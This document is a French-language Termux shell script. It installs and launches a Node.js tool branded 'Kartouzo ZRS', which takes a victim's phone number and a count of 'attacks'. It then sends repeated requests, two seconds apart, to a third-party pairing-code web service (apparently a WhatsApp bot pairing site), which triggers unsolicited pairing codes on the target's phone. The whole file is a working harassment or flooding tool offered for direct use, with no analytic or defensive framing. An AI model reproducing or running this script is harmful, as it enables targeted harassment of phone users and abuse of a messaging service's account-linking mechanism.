#!/data/data/com.termux/files/usr/bin/bash

echo "[*] Installation de Kartouzo ZRS..."

if ! command -v node &> /dev/null; then
    echo "[!] Node.js introuvable. Installation..."
    pkg install nodejs -y
fi

mkdir -p ~/bin

cat > ~/bin/kartouzo << 'EOF'
#!/data/data/com.termux/files/usr/bin/node

const readline = require("readline");

const art = `
\x1b[35m
╔══════════════════════════════════════════════╗
║   ██╗  ██╗ █████╗ ██████╗ ████████╗ ██████╗  ║
║   ██║ ██╔╝██╔══██╗██╔══██╗╚══██╔══╝██╔═══██╗ ║
║   █████╔╝ ███████║██████╔╝   ██║   ██║   ██║ ║
║   ██╔═██╗ ██╔══██║██╔══██╗   ██║   ██║   ██║ ║
║   ██║  ██╗██║  ██║██║  ██║   ██║   ╚██████╔╝ ║
║   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝  ║
║        ⚡ ZRS EDITION — BY KARTOUZO ⚡        ║
╚══════════════════════════════════════════════╝
\x1b[0m`;

const HEADER_COLOR = "\x1b[35m";
const SUCCESS_COLOR = "\x1b[32m";
const INFO_COLOR = "\x1b[34m";
const RESET_COLOR = "\x1b[0m";

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

console.log(art);
console.log(`${SUCCESS_COLOR}  ⚡ Script créé par KARTOUZO — Signature ZRS ⚡${RESET_COLOR}\n`);

const DELAI_MS = 2000;

async function envoyerRequete(url, compteur, total) {
  console.log(`\n${INFO_COLOR}[${compteur}/${total}]${RESET_COLOR} Envoi en cours...`);
  try {
    const res = await fetch(url);
    if (!res.ok) throw new Error(`Erreur HTTP ${res.status} — ${res.statusText}`);
    const data = await res.text();
    console.log(`${SUCCESS_COLOR}[${compteur}/${total}] Réponse :${RESET_COLOR}`, data);
  } catch (erreur) {
    console.error(`${HEADER_COLOR}[${compteur}/${total}] Erreur :${RESET_COLOR}`, erreur.message);
  }
}

async function lancer(cible, attaques, url) {
  for (let i = 1; i <= attaques; i++) {
    await envoyerRequete(url, i, attaques);
    if (i < attaques) await new Promise(r => setTimeout(r, DELAI_MS));
  }
  console.log(`\n${SUCCESS_COLOR}✅ Terminé — KARTOUZO / ZRS${RESET_COLOR}`);
  rl.close();
}

rl.question("Numéro de la cible : ", (r1) => {
  const cible = r1.trim().replace(/\s+/g, "").replace(/^\+/, "");
  const cibleNum = Number(cible);
  rl.question("Nombre d'attaques (3 à 5 recommandé) : ", (r2) => {
    const attaques = Number(r2);
    if (isNaN(cibleNum) || isNaN(attaques) || attaques <= 0) {
      console.log(`${HEADER_COLOR}Entrée invalide.${RESET_COLOR}`);
      rl.close();
      return;
    }
    const url = `https://prabath-md-pair-web-v2-slk.koyeb.app/code?number=${encodeURIComponent(cibleNum)}`;
    lancer(cibleNum, attaques, url);
  });
});
EOF

chmod +x ~/bin/kartouzo

if ! grep -q 'export PATH=$PATH:$HOME/bin' ~/.bashrc; then
    echo 'export PATH=$PATH:$HOME/bin' >> ~/.bashrc
fi

echo "[+] Installation terminée ! Lancement de Kartouzo..."

export PATH=$PATH:$HOME/bin
kartouzo
